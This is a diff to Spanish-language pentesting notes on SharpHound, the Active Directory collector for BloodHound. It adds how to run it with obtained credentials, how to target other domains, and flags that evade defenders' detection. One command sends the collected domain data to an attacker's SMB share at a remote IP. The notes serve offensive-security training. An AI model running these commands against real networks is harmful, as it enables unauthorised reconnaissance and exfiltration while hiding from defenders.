@@ -72,12 +72,39 @@ Para recolectar información en los entornos de windows usamos SharpHound.
 
         .\SharpHound.exe -c <metodo>
 
+
+### Impersonación con SharpHound
+
+Si conseguimos credenciales de otro usuario, podemos utilizarlo mediante las flags --ldapusername --ldappassword 
+
+### Atacar un dominio en específico
+
+SharpHound utiliza el dominio en el que nos encontramos por defecto, pero de haber multiples dominios en el Forest podríamos hacerlo indicando la flag -d y el dominio
+
+        .\SharpHound.exe -c All -d <dominio>
+
 ### Entornos monitorizados
+
 En un escenario donde el entorno se encuentra monitorizado, deberíamos realizar dos recolecciones con SHarpHound.
 
 Primero realizamos una de tipo DCOnly, luego analizamos los resultados buscando computadoras que sean interesantes, creamos una lista de las mismas y luego corremos una computerOnly agregando la flag --computerfile y el file creado de las computadoras
 
         .\SharpHound.exe -c ComputerOnly --computerfile <file>
 
+Se sabe que SharpHound, por defecto, genera distintos .json, que luego guarda en un zip. También genera un archivo con un nombre aleatorio y un .bin que corresponde a la caché de las consultas que realizas. Los equipos de defensa podrían utilizar estos patrones para detectar a Bloodhound. Una forma de intentar ocultar estos rastros es combinando algunas de estas opciones:
 
+| Flag | Desc |
+|---|---|
+|--memcache | mantiene la caché en moria y no escribe en disco |
+|--randomfilenames | Genera nombres de archivos aleatorios incluido el zip (modifica también la extención)|
+|--outputprefix | Pone un prefijo a los archivos generados |
+|--outputdirectory | señala el directorio en el que se guardarán los archivos |
+|--zipfilename | nombra al zip final |
+|--zippassword | da una contraseña al password |
 
+Podríamos entonces levantar un smb y enviar el resultado de bloodhound al mismo
+
+        SharpHound.exe --memcache --outputdirectory \\10.10.14.33\share\ --zippassword <pass> --outputprefix <pref> --randomfilenames
+
+**<u> Atención: </u> **
+Si el archivo que guardamos tiene password vamos a tener que descomprimirlo y luego enviar los archivos resultantes a bloodhound. Si no tiene password, indiferentemente de la extención del mismo, podemos sumarlo a bloodhound.
